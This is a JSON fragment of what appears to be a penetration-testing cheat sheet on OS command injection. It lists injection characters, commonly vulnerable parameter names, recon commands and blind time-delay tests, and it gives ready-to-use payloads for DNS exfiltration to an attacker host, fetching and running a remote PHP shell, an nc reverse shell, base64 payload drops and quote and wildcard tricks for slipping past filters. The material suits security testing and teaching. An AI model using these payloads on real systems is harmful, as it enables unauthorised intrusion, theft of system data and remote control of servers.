    "sections": [
        {
            "type": "hint",
            "variant": "info",
            "content": "Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. This typically occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell."
        },
        {
            "heading": "Detection & Entry Points",
            "type": "code_block",
            "content": [
                "# --- Injection Characters ---",
                "&, ;, \\n (0x0a), &&, |, ||",
                "Example: https://target.com/api?id=1|whoami",
                "",
                "# --- Common Vulnerable Parameters ---",
                "cmd, exec, command, execute, ping, query, jump, code, reg, do, func, arg,",
                "option, load, process, step, read, function, req, feature, exe, module, payload, run, print"
            ]
        },
        {
            "heading": "OS-Specific & Useful Commands",
            "type": "code_block",
            "content": [
                "# --- Linux / Unix ---",
                "whoami         # Current user",
                "ifconfig       # Network interfaces",
                "ls             # List files",
                "uname -a       # System info",
                "cat /etc/passwd # Read sensitive files",
                "",
                "# --- Windows ---",
                "whoami         # Current user",
                "ipconfig       # Network interfaces",
                "dir            # List files",
                "ver            # OS version",
                "type C:\\windows\\win.ini # Read files",
                "",
                "# --- Cross-Platform Detection ---",
                "ls||id; ls ||id; ls|| id; ls || id",
                "ls|id; ls |id; ls| id; ls | id",
                "ls&&id; ls &&id; ls&& id; ls && id",
                "ls&id; ls &id; ls& id; ls & id",
                "ls %0A id"
            ]
        },
        {
            "heading": "Advanced Exploitation",
            "type": "code_block",
            "content": [
                "# --- Blind (Time Delay) ---",
                "& ping -c 10 127.0.0.1 &",
                "https://target.com/page?p=x||ping+-c+10+127.0.0.1||",
                "",
                "# --- Blind (Output Redirection) ---",
                "& whoami > /var/www/images/output.txt &",
                "https://target.com/page?p=x||whoami>/var/www/images/output.txt||",
                "",
                "# --- Out-of-Band (OOB) / DNS Exfiltration ---",
                "& nslookup attacker-server.com &",
                "& nslookup `whoami`.attacker-server.com &",
                "https://target.com/page?p=x||nslookup+`whoami`.burp.collaborator.address||"
            ]
        },
        {
            "heading": "Filter & WAF Bypass",
            "type": "code_block",
            "content": [
                "# --- WAF Bypasses ---",
                "vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php",
                "vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>",
                "vuln=echo PAYLOAD | base64 -d > /tmp/payload; chmod +x /tmp/payload; /tmp/payload",
                "",
                "# --- Path & String Bypasses ---",
                "cat /etc/passwd",
                "cat /e\"t\"c/pa\"s\"swd      # Double quotes",
                "cat /'e'tc/pa's'swd      # Single quotes",
                "cat /etc/pa??wd          # Wildcards",
                "cat /etc/pa*wd           # Asterisk",
                "{cat,/etc/passwd}        # Braces expansion",
                "cat /???/?????d          # Full path wildcarding"
            ]
        },
